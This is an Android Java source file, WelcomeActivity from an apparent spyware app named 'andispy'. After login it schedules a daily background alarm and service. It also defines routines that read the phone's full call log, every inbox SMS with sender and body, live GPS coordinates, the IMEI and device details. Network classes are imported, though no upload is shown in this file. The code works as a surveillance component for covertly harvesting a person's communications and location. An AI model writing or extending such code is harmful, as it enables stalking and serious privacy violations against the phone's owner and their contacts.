package com.andispy.andispy.activity;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.andispy.andispy.BaseActivity;
import com.andispy.andispy.R;
import com.andispy.andispy.lib.BackgroundWork;
import com.andispy.andispy.lib.Completion;
import com.andispy.andispy.lib.Tasks;
import com.andispy.andispy.network.Postdata;
import com.andispy.andispy.reciver.AlarmReceiver;
import com.andispy.andispy.service.MyService;
import com.andispy.andispy.util.Constants;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

import retrofit.Callback;
import retrofit.RetrofitError;
import retrofit.client.Response;

public class WelcomeActivity extends BaseActivity implements LocationListener {
    Toast t;
    TextView textView;
    Cursor managedCursor;


    private LocationManager locationManager;

    private Context mContext;
    private int mProgressStatus = 0;
    IntentFilter iFilter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3_welcome);

        Toast.makeText(getApplicationContext(), "login successfully", Toast.LENGTH_LONG).show();

        textView = (TextView) findViewById(R.id.text);



        start_alaram();
    }

    private void start_alaram() {
        Intent intent = new Intent(this, AlarmReceiver.class);
        intent.setAction("packagename.ACTION");
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this,
                0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        AlarmManager alarm = (AlarmManager) this.getSystemService(Context.ALARM_SERVICE);
        alarm.cancel(pendingIntent);
        alarm.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), AlarmManager.INTERVAL_DAY, pendingIntent);

        startService(new Intent(this,MyService.class));
    }

























    /* --------------------------------------------- Start Call Logs Data ----------------------------------------------------------------*/
    private void getCallDetails() {

        t = Toast.makeText(WelcomeActivity.this, "Call Call Logs Activity..", Toast.LENGTH_SHORT);
        t.show();


        StringBuffer sb = new StringBuffer();
        managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);


        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String phName = managedCursor.getString(name);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = "UNKWON";
            int dircode = Integer.parseInt(callType);


            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            sb.append("\nPhone Number:--- " + phNumber + "\nNAme:--" + phName + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration + "\n--------------------------------------------------------------------------------");

        }
    }

/* --------------------------------------------- End Call Logs Data ----------------------------------------------------------------*//* --------------------------------------------- Start SMS Data ----------------------------------------------------------------*/

/* --------------------------------------------------- Start SMS Data ----------------------------------------------------------------*/

    public void refreshSmsInbox() {
        t = Toast.makeText(WelcomeActivity.this, "Call SMS Activity..", Toast.LENGTH_SHORT);
        t.show();
        ContentResolver contentResolver = getContentResolver();
        StringBuffer s = new StringBuffer();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) return;

        do {
            s.append("SMS From: " + smsInboxCursor.getString(indexAddress) +
                    "\nMsg Body: " + smsInboxCursor.getString(indexBody) + "\n" + "\n------------------------------------------------------------\n");
        } while (smsInboxCursor.moveToNext());
    }


    /* --------------------------------------------- End SMS Data -----------------------------------------------------------------------*/
/* --------------------------------------------- Start GPS Location Data -----------------------------------------------------------------------*/
    public void gpsLocation() {
        t = Toast.makeText(WelcomeActivity.this, "Call GPS Location Activity..", Toast.LENGTH_SHORT);
        t.show();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (ActivityCompat.checkSelfPermission(WelcomeActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
                2000, 1, WelcomeActivity.this);

    }

    @Override
    public void onLocationChanged(Location location) {
        String msg = ("\nNew Latitude: " + location.getLatitude()
                + "\nNew Longitude: " + location.getLongitude());

        Toast.makeText(WelcomeActivity.this, msg, Toast.LENGTH_SHORT).show();

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

        Toast.makeText(getBaseContext(), "Gps is turned off!! ",
                Toast.LENGTH_SHORT).show();

    }

    @Override
    public void onProviderEnabled(String provider) {
        Toast.makeText(getBaseContext(), "Gps is turned on!! ",
                Toast.LENGTH_SHORT).show();

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    /* --------------------------------------------- End GPS Location Data -----------------------------------------------------------------------*/
/* --------------------------------------------- Start Device Info Data -----------------------------------------------------------------------*/
    public void deviceInfo() {
        t = Toast.makeText(WelcomeActivity.this, "Call Device Info Activity..", Toast.LENGTH_SHORT);
        t.show();
        TelephonyManager manager = (TelephonyManager) getSystemService(this.TELEPHONY_SERVICE);

        String brand = ("Brand:" + Build.BRAND);
        String manu = ("Manufacturer : " + Build.MANUFACTURER);
        String model = ("MODEL : " + Build.MODEL);
        String version = ("VERSION : " + Build.VERSION.SDK_INT);
        String imei = ("IMEI : " + manager.getDeviceId());

        mContext = getApplicationContext();


        iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);

        mContext.registerReceiver(mBroadcastReceiver, iFilter);

        Toast.makeText(mContext, "\n" + brand + "\n" + manu + "\n" + model + "\n" + version + "\n" + imei, Toast.LENGTH_SHORT).show();


    }

    BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);

            int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);

            float percentage = level / (float) scale;
            mProgressStatus = (int) ((percentage) * 100);

            String bettary = ("Percentage : " + mProgressStatus + "%");


        }
    };



/* --------------------------------------------- End Device Info Data -----------------------------------------------------------------------*/
}